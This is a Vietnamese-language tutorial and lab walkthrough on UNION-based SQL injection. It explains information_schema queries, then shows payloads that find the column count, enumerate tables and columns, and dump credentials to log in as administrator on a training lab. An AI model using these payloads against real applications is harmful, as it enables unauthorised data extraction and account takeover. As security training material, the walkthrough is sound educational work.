# Listing the contents of the database

Hầu hết các hệ quản trị cơ sở dữ liệu (trừ Oracle) đều có một tập hợp các **view đặc biệt** gọi là **information schema**. Các view này cung cấp thông tin về cấu trúc của cơ sở dữ liệu.

**1. Liệt kê danh sách bảng trong cơ sở dữ liệu**

Có thể truy vấn **information_schema.tables** để lấy danh sách các bảng:

    SELECT * FROM information_schema.tables

Truy vấn này sẽ trả về kết quả như sau:

    TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE  
    =====================================================  
    MyDatabase     dbo           Products    BASE TABLE  
    MyDatabase     dbo           Users       BASE TABLE  
    MyDatabase     dbo           Feedback    BASE TABLE  

Dữ liệu này cho biết cơ sở dữ liệu có **ba bảng**, lần lượt là **Products**, **Users**, và **Feedback**.

**2. Liệt kê danh sách cột trong một bảng cụ thể**

Có thể truy vấn **information_schema.columns** để lấy thông tin về các cột trong một bảng cụ thể. Ví dụ, để liệt kê các cột của bảng **Users**:

    SELECT * FROM information_schema.columns WHERE table_name = 'Users'

Truy vấn này sẽ trả về kết quả như sau:

    TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE  
    =================================================================  
    MyDatabase     dbo           Users       UserId       int  
    MyDatabase     dbo           Users       Username     varchar  
    MyDatabase     dbo           Users       Password     varchar  

Kết quả này cho thấy bảng **Users** chứa **ba cột**:

- UserId (kiểu dữ liệu int)
- Username (kiểu dữ liệu varchar)
- Password (kiểu dữ liệu varchar)

Sử dụng các truy vấn này, kẻ tấn công có thể tìm ra cấu trúc của cơ sở dữ liệu và từ đó lên kế hoạch **truy xuất hoặc thao túng dữ liệu** theo ý muốn.

# Lab: SQL injection attack, listing the database contents on non-Oracle databases

![img](85)

Truy cập lab: 

![img](86)

Chọn category Lifestyle và intercept request trong Burp Suite: 

![img](87)

Thử chèn payload **'+UNION+SELECT+NULL,NULL--** vào tham số category để kiểm tra số lượng cột trong truy vấn gốc: 

![img](88)

Send request, quan sát response: 

![img](89)

=> Thành công biết rằng số lượng cột của truy vấn gốc là 2. 

Thử kiểm tra xem cột nào nhận giá trị kiểu chuỗi: 

![img](90)

Send request, quan sát response: 

![img](91)

=> Cả 2 cột có thể chứa giá trị kiểu chuỗi. 

Chèn payload **'UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--** để lấy ra tên bảng trong CSDL: 

![img](92)

Send request, quan sát response:

![img](93)

=> Tìm ra tên bảng chứa thông tin về users: users_twsmtx

Tiếp theo cần tìm tên các cột trong bảng này, sử dụng payload **'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_twsmtx'--**:

![img](94)

Send request, quan sát response: 

![img](95)

![img](96)

=> Tìm ra cột lưu thông tin username: username_wmowzy và cột lưu thông tin password là: password_tqaahw

Như vậy đã tìm ra tên bảng và tên cột, tiếp theo sử dụng payload **'UNION SELECT username_wmowzy, password_tqaahw FROM users_twsmtx--** để trích xuất thông tin: 

![img](97)

Send request, quan sát response: 

![img](98)

=> username: administrator và password: xqq27g94tizfndzfgd2p

Login tài khoản administrator: 

![img](99)

Solved the lab!

![img](100)






